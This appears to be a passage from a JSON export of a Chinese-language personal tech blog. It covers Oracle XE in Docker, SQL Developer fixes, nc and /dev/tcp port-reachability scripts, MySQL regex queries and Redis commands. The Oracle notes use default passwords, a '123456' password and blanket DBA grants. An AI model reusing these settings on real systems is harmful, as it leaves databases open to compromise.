consider this formula:\noracle_1  | processes=x\noracle_1  | sessions=x*1.1+5\noracle_1  | transactions=sessions*1.1\noracle_1  | \noracle_1  | Oracle Database 11g Express Edition Configuration\noracle_1  | -------------------------------------------------\noracle_1  | This will configure on-boot properties of Oracle Database 11g Express \noracle_1  | Edition.  The following questions will determine whether the database should \noracle_1  | be starting upon system boot, the ports it will use, and the passwords that \noracle_1  | will be used for database accounts.  Press <Enter> to accept the defaults. \noracle_1  | Ctrl-C will abort.\noracle_1  | \noracle_1  | Specify the HTTP port that will be used for Oracle Application Express [8080]:\noracle_1  | Specify a port that will be used for the database listener [1521]:\noracle_1  | Specify a password to be used for database accounts.  Note that the same\noracle_1  | password will be used for SYS and SYSTEM.  Oracle recommends the use of \noracle_1  | different passwords for each database account.  This can be done after \noracle_1  | initial configuration:\noracle_1  | Confirm the password:\noracle_1  | \noracle_1  | Do you want Oracle Database 11g Express Edition to be started on boot (y/n) [y]:\noracle_1  | Starting Oracle Net Listener...Done\noracle_1  | Configuring database...Done\noracle_1  | Starting Oracle Database 11g Express Edition instance...Done\noracle_1  | Installation completed successfully.\noracle_1  | Database initialized. Please visit http://#containeer:8080/apex to proceed with configuration\noracle_1  | Oracle Database 11g Express Edition instance is already started\noracle_1  | \noracle_1  | Starting import from '/docker-entrypoint-initdb.d':\noracle_1  | found file /docker-entrypoint-initdb.d//docker-entrypoint-initdb.d/*\noracle_1  | [IMPORT] /entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*\noracle_1  | \noracle_1  | Import finished\noracle_1  | \noracle_1  | Database ready to use. Enjoy! ;)\n```\n\n\n## 其他可參考設定\n\n[docker安装wnameless/oracle-xe-11g并运行（手写超详细） - 哈喽，小枫 - 博客园](https://www.cnblogs.com/Jin520304/p/7884441.html)\n[使用 Docker Oracle | Zoctan's Blog](https://zoctan.github.io/2018/05/21/%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B/%E4%BD%BF%E7%94%A8%20Docker%20Oracle/)\n\n[acktsw/oracle-xe-11g Dockerfile - Docker Hub](https://hub.docker.com/r/acktsw/oracle-xe-11g/dockerfile)\n這個不知道為什麼帳號密碼無法登入，不過 ssh server 設定可以當參考\n\n[docker compose安装oracle_数据库_落叶飘零z的博客-CSDN博客](https://blog.csdn.net/qq_38270106/article/details/83271284)\n\n\n## 新增資料表前置作業\n\n其實上面安裝好，不能馬上建制資料表\n後來查了一下，要用新增使用者帳號去做\n\n\nSID 沒有找到修改的方法\n\n> XE版本裡只能有一個instance， 我將SID修改了以後貌似會報錯，所以SID就不用修改了。\n> BASE和HOME兩個變量後儘量不要加斜線 '/' ,有可能會報錯，雖然不知到為什麼... 同時，TNS_ADMIN這個變量一定要有。\n> 參考[Linux下安裝Oracle Database 11g Express Edition_Perserve In Learning-CSDN博客](https://blog.csdn.net/u013569416/article/details/41895389)\n\nOracle 11帳號密碼\n這邊紀錄 Dbeaver 登入\nuser:system\npwd: oracle\nnormal\n----\nuser: sys\npwd: oracle\ndba\n\n這邊進去不能新增資料表\n要新增帳號\ndbeaver 可以新增模式比較快\n新增帳號還序要設定權限\n\n```sql\nGRANT CONNECT, RESOURCE, DBA TO miles;\n```\n設定玩資料夾就可以建制了\n\n這邊也有發現 Oracle 12 上新增帳號設定需要特別設定\n\n```sql\nALTER SESSION SET \"_ORACLE_SCRIPT\"=TRUE;\nCREATE USER miles IDENTIFIED BY 123456;\nGRANT CONNECT, RESOURCE, DBA TO miles;\nALTER SESSION SET \"_ORACLE_SCRIPT\"=FALSE;\n```\n參考: [[Docker] 使用 Docker 建立 Oracle 服務 - Miles's Journey](https://mileslin.github.io/2019/06/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%AB%8B-Oracle-%E6%9C%8D%E5%8B%99/)\n\n\n\n\n相關連結\n\n* [在 Docker 中建立 Oracle 12c 的測試主機 | 想不起來而已](https://yingclin.github.io/2018/create-oracle-docker-container.html)\n* [使用 Docker 建立 Oracle 12c & 新增使用者建立範例資料庫 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10229655)\n* [在 CentOS 安裝 Oracle XE 18c-黑暗執行緒](https://blog.darkthread.net/blog/setup-xe-centos/)\n* [使用 Docker Oracle | Zoctan's Blog](https://zoctan.github.io/2018/05/21/%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B/%E4%BD%BF%E7%94%A8%20Docker%20Oracle/)\n* [CENTOS 7 使用Docker安装oracle 11g - 特拉仔的个人空间 - OSCHINA](https://my.oschina.net/u/3049601/blog/3112371)\n[批处理执行多个SQL文件到oracle - jack_Meng - 博客园](https://www.cnblogs.com/mq0036/p/4724466.html)\n\n\n## docker-entrypoint-initdb.d\n\n```bash\n\t\t\tfor f in /docker-entrypoint-initdb.d/*; do\n\t\t\t\techo \"found file /docker-entrypoint-initdb.d/$f\"\n\t\t\t\tcase \"$f\" in\n\t\t\t\t\t*.sh)     echo \"[IMPORT] $0: running $f\"; . \"$f\" ;;\n\t\t\t\t\t*.sql)    echo \"[IMPORT] $0: running $f\"; echo \"exit\" | su oracle -c \"NLS_LANG=.$CHARACTER_SET $ORACLE_HOME/bin/sqlplus -S / as sysdba @$f\"; echo ;;\n\t\t\t\t\t*.dmp)    echo \"[IMPORT] $0: running $f\"; impdp $f ;;\n\t\t\t\t\t*)        echo \"[IMPORT] $0: ignoring $f\" ;;\n\t\t\t\tesac\n\t\t\t\techo\n\t\t\tdone\n```\n\n由於這個關係，我可以簡單設定 db schmema create 語法\n\ninit.sql 放在 /docker-entrypoint-initdb.d/\n裡面放 sql 資料夾\n注意，sql 資料夾並不會執行(* 只會抓到同意層資料)\n\ninit.sql\n```sql \nCREATE USER XXXX IDENTIFIED BY XXXX;\nGRANT CONNECT, RESOURCE, DBA TO XXXX;\nCREATE USER XXXXMGR IDENTIFIED BY XXXX;\nalter session set current_schema=XXXXMGR;\n@/docker-entrypoint-initdb.d/sql/schema/xxxx.sql\n```\n\nlist 資料夾所有目錄方法\n\n find  `pwd` -type f \n\n 就可把相關 sql 用出來\n\n\n docker-compose.yml 留一下\n\n ```yml \nversion: '2'\nservices:\n  oracle:\n    image: oracle-xe-11g\n    restart: always   #如果docker容器由于一些问题挂掉的化，docker-composer会自动把容器给启动起来\n    ports:\n      - 1521:1521\n      - 8080:8080\n      - 22:22\n    volumes:\n    - ./docker-entrypoint-initdb.d/:/docker-entrypoint-initdb.d/\n    environment: \n      - LC_ALL=C.UTF-8 \n````","tags":["oracle"],"categories":["Docker"]},{"title":"sqldeveloper 打開閃退解決方法","url":"%2Fblog%2F2020%2F03%2F07%2Fsqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95%2F","content":"\n最近使用 sqldeveloper 開啟出現問題，瞬間打開會閃退\n網路上查到一些原因\n但都無法解決\n\n<!--more-->\n\n網路上有看到三種解決方法，這邊整理一下\n\n## 抓舊版 jdk\n\n這邊是網路大多數都是使用這個方法，但我無法解決。\n我發現使用這個都是抓 sqldeveloper 不包含 jdk 版本\n通常 jdk 版本不能太新(需要 1.6 版本)\n還有需要設定 conf jdk 路徑\nsqldeveloper.conf 設定 SetJavaHome\n可參考[Oracle 11g自带的sqldeveloper.exe打不开问题_数据库_weixin_38569499的博客-CSDN博客](https://blog.csdn.net/weixin_38569499/article/details/80316277)\n\n## 清除使用者暫存資料 \n\n\n> In my case i had 2 folders under C:\\Users\\username\\AppData\\Roaming\\\n> \n>     sqldeveloper\n>     SQL developer\n> \n> after removing both of them and launching installation dir\\sqldeveloper\\sqldeveloper\\bin\\sqldeveloper64.exe it worked.\n\n\n刪除 C:\\Users\\username\\AppData\\Roaming\\ 裡面的 `sqldeveloper`,`SQL developer` 兩個資料夾\n就可以正常運行\n\n仔細想想一開始打開 sqldeveloper 我有移動過位置\n不知道是不是這個關係，所以才會導致?\n\n## 看到奇怪的解決方式\n\n試過，我的不是這個問題\n\n[SQL Developer 開啟失敗解決辦法 - IT閱讀](https://www.itread01.com/content/1544637086.html)\n\n## Dbeaver 連 OJDBC 方法\n\nDbeaver 會導向官網叫你下載 OJDBC ，但這個有分版本\n我因為懶惰使用 sqldeveloper 裡面 OJDBC (*.jar)\n可以登入，但查詢 SQL 會有錯誤訊息\n\n```\norg.jkiss.dbeaver.model.sql.DBSQLException: SQL 错误: jdbc 驱动内部错误\n\tat org.jkiss.dbeaver.model.impl.jdbc.exec.JDBCStatementImpl.executeStatement(JDBCStatementImpl.java:134)\n\tat org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.executeStatement(SQLQueryJob.java:486)\n\tat org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.lambda$0(SQLQueryJob.java:424)\n\tat org.jkiss.dbeaver.model.exec.DBExecUtils.tryExecuteRecover(DBExecUtils.java:159)\n\tat org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.executeSingleQuery(SQLQueryJob.java:416)\n...\n```\n\n後來我發現，要去官網抓 ojdbc-full.tar.gz\n匯出全部 jar ，去設定 Dbeaver 就能設定了\n\n注意 OJDBC 也有分版本，要使用對應 Oracle 版本\n\n\n## 想關連結\n\n[Oracle 11g自带的sqldeveloper.exe打不开问题_数据库_weixin_38569499的博客-CSDN博客](https://blog.csdn.net/weixin_38569499/article/details/80316277)\n[sql - SQLDeveloper not starting - Stack Overflow](https://stackoverflow.com/questions/22810318/sqldeveloper-not-starting)\n[Oracle SQL Developer 小技巧 #3 : 電腦當機、沒存檔救回之前編寫的SQL Script - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10198477)","tags":["sqldeveloper"],"categories":["SQL"]},{"title":"檢查大量不同 IP 跟 Port 方法","url":"%2Fblog%2F2020%2F03%2F07%2F%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95%2F","content":"\n最近要測試大量主機 Port ，看裡面東西有沒有開通\n使用大量 `telnet ip port` 非常花很多時間\n最近在想有沒有好用的工具方便我們檢查\n\n<!--more-->\n\n## 建立多台 vagrant 連線\n\n```ruby\nVagrant.configure(\"2\") do |config|\n  config.vm.provision \"shell\", inline: \"echo Hello\"\n  config.vm.define \"web\" do |web|\n    web.vm.box = \"ubuntu/xenial64\"\n    web.vm.network \"private_network\", ip: \"192.168.50.2\"\n  end\n\n  config.vm.define \"db\" do |db|\n    db.vm.box = \"ubuntu/xenial64\"\n    db.vm.network \"private_network\", ip: \"192.168.50.3\"\n  end\nend\n```\n\n\n## nc 檢查法\n\n```\n$ timeout 2 bash -c \"</dev/tcp/canyouseeme.org/80\"; echo $?\n0\n$ timeout 2 bash -c \"</dev/tcp/canyouseeme.org/81\"; echo $?\n124\n$ timeout --preserve-status 2 bash -c \"</dev/tcp/canyouseeme.org/81\"; echo $?\n143\n$ nc -w 2 -v canyouseeme.org 80 </dev/null; echo $?\nConnection to canyouseeme.org 80 port [tcp/http] succeeded!\n0\n$ nc -w 2 -v canyouseeme.org 81 </dev/null; echo $?\nnc: connect to canyouseeme.org port 81 (tcp) timed out: Operation now in progress\n1\n```\n[Test if remote TCP port is open from a shell script - Stack Overflow](https://stackoverflow.com/questions/4922943/test-if-remote-tcp-port-is-open-from-a-shell-script/14701003#14701003)\n\n[Bash/nc: netcat as a simple port scanner](https://gist.github.com/gerjantd/9787606)\n[Firxiao/check_service_ports: A tool (based nc) check service's tcp or udp is opened or closed](https://github.com/Firxiao/check_service_ports)\n\n\n```bash\nfor i in {10.21.xxx.yyy,10.21.xxx.yyy,10.23.xxx.yyy};\ndo\n        for j in {5501,5502,5503,5504,7701,7702,7703,7704,5551,5552,5553,7771,7772,7773};\n        do\n                (echo > /dev/tcp/${i}/${j}) > /dev/null 2>&1 && echo \"${i}:${j} :: it's getting connected\" || echo \"${i}:${j} :: it's not connecting\"\n        done\ndone\n```\n\n[bash - Shell Script - telnet multiple hosts:ports - Stack Overflow](https://stackoverflow.com/questions/29392568/shell-script-telnet-multiple-hostsports)\n發現這個範例還滿適合我現在的需求\n用這個 shell 小改，順便加個顏色[Bash Shell 顯示 顏色的語法 | Tsung's Blog](https://blog.longwin.com.tw/2015/02/bash-shell-color-display-2015/)\n\n```bash\n#!/bin/bash\nCOLOR_REST='\\e[0m';\nCOLOR_GREEN='\\e[0;32m';\nCOLOR_RED='\\e[0;31m';\n\n\nfor i in tw.yahoo.com google.com.tw;\ndo\n        for j in 80 233;\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: it's getting connected${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: it's not connecting${COLOR_REST}\"\n        done\ndone\n```\n\n顏色 echo 需要加 `-e`\n第一次看到 shell 可以用 `{}`包迴圈\n不過只有單筆會有問題樣子\n所以我這邊有簡單調整另外一種寫法\n\n例外還有多種運用\n[第6期：使用nc批量做网络连通性测试 - 知乎](https://zhuanlan.zhihu.com/p/79244844)\n```bash\n#!/bin/bash\n# checking network connectivity\n\n# IPs and ports to check\n# Ignore blank lines and treat hash sign as comments\n# comments will be kept as a comment of result\nIP_PORT=\"\n# local host \n127.0.0.1 22\n127.0.0.1 21\n# well known sites\nwww.google.com 80\nwww.baidu.com 80\n\"\n\n# checking\necho \"$IP_PORT\" | grep -Ev \"^$\" |\nwhile read line;do\n  # simply print comment line\n  echo \"$line\" | grep -qE \"^#\"\n  if [ $? -eq 0 ];then\n      echo \"$line\"\n      continue\n  fi\n\n  # normal line with ip and port\n  connectFlag=\"DOWN\"\n  nc -z -w 1 $line\n  if [ $? -eq 0 ];then\n      connectFlag=\"UP\"\n  fi\n\n  printf \"%-20s %5s %5s\\n\" $line $connectFlag\ndone\n```\n\n以下方案失敗 QQ\n先留著\n## 使用 ansible 方法\n\n[Ansible Playbook for network port checking from host level — OpenShift as example](https://medium.com/@chanhiuyeung/ansible-playbook-for-network-port-checking-from-host-level-openshift-as-example-fb1960090fdf)\n\n有看到有人用 ansible 做出符合我的需求工具\n這邊就順便驗證是否可以正常執行\n\n### ansible 安裝\n\nwindow 不能安裝 ansible\n[Installing Ansible — Ansible Documentation](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html)\n更多系統可以參考上面連結\n\n```bash\nsudo apt update\nsudo apt install software-properties-common\nsudo apt-add-repository --yes --update ppa:ansible/ansible\nsudo apt install ansible\n```\n\n### ansible\n\nFAILED => Using a SSH password instead of a key is not possible because Host Key checking is enabled and sshpass does not support this.  Please add this host's fingerprint to your known_hosts file to manage this host.\n[ansible小结（四）ansible.cfg与默认配置 - 运维之路](http://www.361way.com/ansible-cfg/4401.html)\n\nhost_key_checking = False  \n\n\n\n## 其他類似程式\n\n[Check Host - 小巧實用網路監控軟體 ~ 不自量力 の Weithenn](http://www.weithenn.org/2011/11/check-host.html)\n\n\n[Ansible Playbook for network port checking from host level — OpenShift as example](https://medium.com/@chanhiuyeung/ansible-playbook-for-network-port-checking-from-host-level-openshift-as-example-fb1960090fdf)\n[Connectivity check WITH Ansible - DEV Community 👩‍💻👨‍💻](https://dev.to/koh_sh/connectivity-check-with-ansible-1po)\n[testing - Ansible: Other option available for telnet check of open ports? - DevOps Stack Exchange](https://devops.stackexchange.com/questions/1658/ansible-other-option-available-for-telnet-check-of-open-ports)\n[Test if a server is reachable from host and has port open with Ansible - Stack Overflow](https://stackoverflow.com/questions/39800368/test-if-a-server-is-reachable-from-host-and-has-port-open-with-ansible)\n[ansible-testing/test_tcp at master · willthames/ansible-testing](https://github.com/willthames/ansible-testing/blob/master/test_tcp)\n[guerzon/ansible-netcat: Ansible proof-of-concept - netcat systemd service](https://github.com/guerzon/ansible-netcat)\n\n\n## Window 不使用 telnet 方法\n\n```sh\n#powershell\nTest-NetConnection -ComputerName “www.google.com” -Port 443\n```\n\n不知道為什麼我朋友電腦不能使用`telnet`(有開啟設定)\n後來發現有這個指令\n[利用PowerShell的Test-NetConnection來取代Telnet來檢查網站的Port有沒有被開啟 | by CarterTsai | Medium](https://medium.com/@CarterTsai/%E5%88%A9%E7%94%A8powershell%E7%9A%84test-netconnection%E4%BE%86%E5%8F%96%E4%BB%A3telnet%E4%BE%86%E6%AA%A2%E6%9F%A5%E7%B6%B2%E7%AB%99%E7%9A%84port%E6%9C%89%E6%B2%92%E6%9C%89%E8%A2%AB%E9%96%8B%E5%95%9F-5bc18909ce67)\n\n\n多台電腦指令\n\n```\n'192.168.0.101','192.168.0.102','Computer-012' | Test-NetConnection -Port 135\n\nGet-Content -Path .\\computers.txt | Test-NetConnection -Port 1\n```\n更多相關:\n[Run Test-NetConnection on multiple machines, the best way：PowerShell](https://www.reddit.com/r/PowerShell/comments/ff2x1f/run_testnetconnection_on_multiple_machines_the/)\n[Test connection to servers on several ports - Powershellbros.com](https://www.powershellbros.com/test-connection-to-servers-on-several-ports/)\n\n\n## 工作用測 IP  PORT 的腳本\n\n記得把 IP1,IP2 關鍵字換成IP\n\n```bash\n#!/bin/bash\nCOLOR_REST='\\e[0m';\nCOLOR_GREEN='\\e[0;32m';\nCOLOR_RED='\\e[0;31m';\n\necho \"正式環境\";\n\n# 443\nfor i in {IP1,IP2,IP3};\ndo\n        for j in 443;\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\"\n        done\ndone\n\n# 9101\nfor i in {IP1,IP2,IP3}\ndo\n        for j in 9101;\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\"\n        done\ndone\n\n# 1549\nfor i in IP1\ndo\n        for j in 1549;\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\"\n        done\ndone\n\n\necho \"驗證環境\";\n\n\n# 26112\nfor i in {IP1,IP2};\ndo\n        for j in 26112;\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\"\n        done\ndone\n\n# 9101\nfor i in {IP1,IP2,IP3};\ndo\n        for j in 9101;\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\"\n        done\ndone\n\n\n# 有兩個 port 1549,1561\nfor i in IP1;\ndo\n        for j in {1549,1561};\n        do\n                (nc -zv -w 5 ${i} ${j}) > /dev/null 2>&1 && echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\"\n        done\ndone\n\n```","tags":["shell"],"categories":["Linux"]},{"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","url":"%2Fblog%2F2020%2F02%2F20%2F%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95%2F","content":"\n最近報表需要撈出中文字\n找了一些方法可以用 SELECT 句子撈出\n\n這篇尚未整理，有空再測試\n<!--more-->\n\n\n## UTF-8 中文範圍\n\n[utf-8 繁體中文編碼表 範圍 是多少_百度知道](https://zhidao.baidu.com/question/480799001.html)\n[MySQL 判断中文字符 | Cryptospace](https://dbarobin.com/2015/01/16/distinguish-chinese-characters-in-mysql/)\n[utf-8,Unicode (UTF-8),utf-8编码,Unicode (UTF-8)编码,utf-8字符,Unicode (UTF-8)字符,utf-8编码对照表,Unicode (UTF-8)编码对照表](https://www.haomeili.net/CodeDown/html/double/all/utf-8_65001.html)\n[整理 Unicode 經常會使用到的內碼區域並透過 Regex 自動比對文字 | The Will Will Web](https://blog.miniasp.com/post/2019/01/02/Common-Regex-patterns-for-Unicode-characters)\n\n\n## SQL 方法\n\n### 使用正規化\n\nmysql> SELECT v\n    -> FROM\n    -> (\n    ->    SELECT 'sql server是微软开发的数据库管理系统'  AS v UNION ALL\n    ->    SELECT 'C-123456789' AS v UNION ALL\n    ->    SELECT 'MySQL是一个开源的数据库管理系统' AS v UNION ALL\n    ->    SELECT 'sdalfkj'\n    -> )t\n    -> WHERE v REGEXP '[吖-座]'=1;\n+--------------------------------------+\n| v                                    |\n+--------------------------------------+\n| sql server是微软开发的数据库管理系统 |\n| MySQL是一个开源的数据库管理系统      |\n+--------------------------------------+\n2 rows in set (0.03 sec)\n————————————————\n版权声明：本文为CSDN博主「不想长大啊」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/sqlserverdiscovery/article/details/50443042\n\n### length和char_length\n\n```sql\nSELECT length(\"你好\"),char_length(\"你好\");\n```\n長度不一樣就是含有非英文字!!\n\n\n## 其他小記\n\n[【MySQL编程你也行】MySQL 识别是否是中文字符的方法_数据库_SQL Server探索-CSDN博客](https://blog.csdn.net/sqlserverdiscovery/article/details/50443042)\n\n[» MySQL 两种识别是否有中文字符的方法](http://www.zhdba.com/mysqlops/2011/02/21/mysql-%E4%B8%A4%E7%A7%8D%E8%AF%86%E5%88%AB%E6%98%AF%E5%90%A6%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E7%9A%84%E6%96%B9%E6%B3%95/)\n\n[Unicode 编码相关 - 简书](https://www.jianshu.com/p/81bfe3db7bcf)\n\n\n```SELECT 'ALL I NEED IS YOU の' REGEXP '^[[:<:]]ALL I NEED IS YOU[[:>:]] *((-.+)|([\\[].+[\\]])|([【].+[】])|([\\(].+[\\)])|([一-龥]+))$'```\n\n\n[oracle查詢欄位是否含有中文 - IT閱讀](https://www.itread01.com/content/1543457232.html)","tags":["regex"],"categories":["SQL"]},{"title":"大量A表排除特定B表 id 排除方法小記","url":"%2Fblog%2F2020%2F02%2F19%2F%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98%2F","content":"\n最近需求需要A表過濾B表\n但是資料量非常大\n處理時間非常久\n\n<!--more-->\n\n## 刪除方法得到結果\n\n```sql\nSELECT id FROM A  LEFT JOIN B ON A.id = B.id WHERE B.id is null \n-- 執行非常久\n-- 後來想嘗試用刪除資料看看結果，資料表都是暫時的\n\nDELETE FROM A WHERE A.id IN (SELECT id FROM B)\n-- 執行非常久\n\nDELETE a FROM A a INNER JOIN B b ON a.id = b.id\n-- 執行非常快\n\n```\n之前有紀錄[SQL UPDATE 和 DELETE 趴配 JOIN 方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/16/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/)\n\n最後我使用上面方式解決這個方法\n\n## 使用 NOT EXISTS\n\n其實以前就有聽過 EXISTS 效能是不錯的\n剛好爬文看到[LEFT JOIN / IS NULL vs. NOT IN vs. NOT EXISTS: nullable columns at EXPLAIN EXTENDED](https://explainextended.com/2010/05/27/left-join-is-null-vs-not-in-vs-not-exists-nullable-columns/)\n看到使用 NOT EXISTS 還滿不錯的\n但是做 `count(distinct)` 還是很慢\ngroup by 也不快\n\n```sql\nSELECT id FROM A  LEFT JOIN B ON A.id = B.id WHERE B.id is null \n```\n\n又空想到好的方式在做筆記\n\n## 可以在探討方法\n\n### pandas\n\n[Python之使用Pandas庫實現MySQL資料庫的讀寫 | 程式前沿](https://codertw.com/%E8%B3%87%E6%96%99%E5%BA%AB/16156/)\n[Pandas 加载数据的I/O性能比较 - This is Robert Lexis.](https://robertlexis.github.io/2017/11/21/Pandas-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E7%9A%84I-O%E6%80%A7%E8%83%BD%E6%AF%94%E8%BE%83/)\n[[Pandas]一个Pandas VS MySQL SQL 的性能对比 - FlyML](https://www.flyml.net/2019/03/25/pandas%e4%b8%80%e4%b8%aapandas-vs-mysql-sql-%e7%9a%84%e6%80%a7%e8%83%bd%e5%af%b9%e6%af%94/)\n\n### SQL\n\n[LEFT JOIN / IS NULL vs. NOT IN vs. NOT EXISTS: nullable columns at EXPLAIN EXTENDED](https://explainextended.com/2010/05/27/left-join-is-null-vs-not-in-vs-not-exists-nullable-columns/)\n[SQL好文分享 - 十步完全理解 SQL | 程式狂想筆記](https://malagege.github.io/blog/2017/07/10/logdown/2017-07-10-sql-fine-literature-ten-steps-to-fully-understand-the-sql/)\n[經典：十步完全理解 SQL-知識星球](http://www.ipshop.xyz/12766.html)\n\n\n**2020-03-05**\n\n> 通過使用EXISTS，Oracle會首先檢查主查詢，然後執行子查詢直到它找到第一個匹配項，這就節省了時間。Oracle在執行IN子查詢時，首先執行子查詢，並將獲得的結果列表存放在一個加了索引的臨時表中。在執行子查詢之前，系統先將主查詢掛起，待子查詢執行完畢，存放在臨時表中以後再執行主查詢。這也就是使用EXISTS比使用IN通常查詢速度快的原因\n\n[SQL中EXISTS與IN的效率問題 - IT閱讀](https://www.itread01.com/content/1547569286.html)\n\n通常 exists 子查詢是查到有資料才會出來\n這邊要特別注意","tags":["sql"],"categories":["SQL"]},{"title":"mysqldump  匯出 CSV 方法小記","url":"%2Fblog%2F2020%2F02%2F19%2Fmysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98%2F","content":"\n這篇只記錄，尚未測試\n\n<!--more-->\n\n## secure_file_priv\n\n[利用mysqldump命令导出为csv格式文件 - Adrian·Ding - 博客园](https://www.cnblogs.com/ding2016/p/9548528.html)\n\n\n## csvdump\n\n[manticorp/CSVDump: A fast, effective and reliable tool for dumping CSV files into a MySQL database.](https://github.com/manticorp/CSVDump)\n\n[bobby96333/csvdump: remote dump data from mysql](https://github.com/bobby96333/csvdump)\n\n有查到這兩個，感覺都不錯用","tags":["sql"],"categories":["SQL"]},{"title":"Redis 小記","url":"%2Fblog%2F2020%2F02%2F17%2FRedis-%E5%B0%8F%E8%A8%98%2F","content":"\n常常專案使用 redis\n但並沒有深入了解\n因為 Redis 一般看範例就知道怎麼使用了\n真的非常簡單\n但我覺得用那麼多次\n沒深入了解不是很好\n這篇整理一下\n\n<!--more-->\n\n## 安裝\n\n上一篇是用 ansible 安裝 redis\n這篇就不做了...\n\n其個更快的話可以用 `apt install redis-server`\n\n## Redis 一般常用類型\n\n1. String (最大可存 512 MB)\n2. Hash\n3. List\n4. Map\n5. Sorted Map(zmap)\n\n## 一般常用指令\n\n### keys *\n\n一般線上不會用這個指令，好像會有阻塞的可能。\n\n### dbsize \n\n回傳 `key` 的數量。\n\n### exists\n\n查詢 `key` 是否存在。\n\nreturn 1 存在，0 不存在\n\n### del\n\n刪除 key\n\n### expire\n\n設定 key 結束時間\n\n### ttl\n\n查看 key 剩餘時間\n\n-1 沒有限制\n-2 沒有 key 存在\n### type\n\n查看 key 的類型\n\n### incr\n\n會把 key 的 value 加 1\n\n這個是 redis 適合做計數器\n\n## 類型相關指令\n\n### String\n\n#### set\n\nset \n\n四個 option\n\n#### setex\n\nsetex key second value\n\n跟 \nset key value\nexpire key second \n一樣動作\n\nset key value ex second\n\n#### setnx\n\nkey 不存在才做設定值\n\n#### mset\n\nmset key1 value1 key2 value2\n\n可以多個設定值\n\n一般 set \nn次set時間=n次網路時間+n次命令\n但是 mset 只需要一次網路時間\nmset時間=`1`次網路時間+n次命令\n\n#### mget\n\n跟 mset 與 set 關係差不多\n如上。\n\n找不到會回傳 nil(null)\n\n#### append\n\nappend key value\n\n會在 value 值後面加入新 value 值\n就算不存在也不會有問題\n\n#### strlen\n\nkey 的 value 長度\n沒資料的話，回傳 0\n\n#### getset\n\ngetset key value\n回傳值是舊值\n\n### Hash\n\n#### hset\n\nhset key field value\n\nhset user:1 name josh\n\n#### hget\n\nhget key field\n\nhget user:1 name\n\n#### hsetnx\n\nhsetnx key field value\n\n#### hdel\n\nhdel 刪除 key 的 field\n\n#### hlen\n\nhlen 抓取 key 的長度\n\n#### hkeys\n\n這邊 hkeys 跟 key 完全沒有關係\n列出 key 裡面的 field\n\n#### hmset,hmget\n\nhmset key field1 value1 field2 value2 ...\n\n#### hexist\n\nhmget key field1 filed2 ...\n\n#### hvals\n\nhvals key \n\n#### hgetall\n\nhgetall 會把所有field,value抓出來。\n老實說我還不知道這個能做什麼?\n會阻塞，可以使用 hscan 代替\n\n#### hstrlen\n\n抓取 key field 長度\n\n#### hincrby\n\nhincrby key field 1\n回傳累加值\n\n#### hincrbyfloat\n\nhincrbyfloat key filed \n回傳累加值\n\n### List\n\n#### lpush\n\nlpush  key value\n\nl => left \n在 list 左邊加入 value\n\n#### rpush\n\nr => right\n同上，但家在右邊 list\n\n#### lpop\n\nl => left \n移除(拿出) 左邊 list 的 value\n\n#### 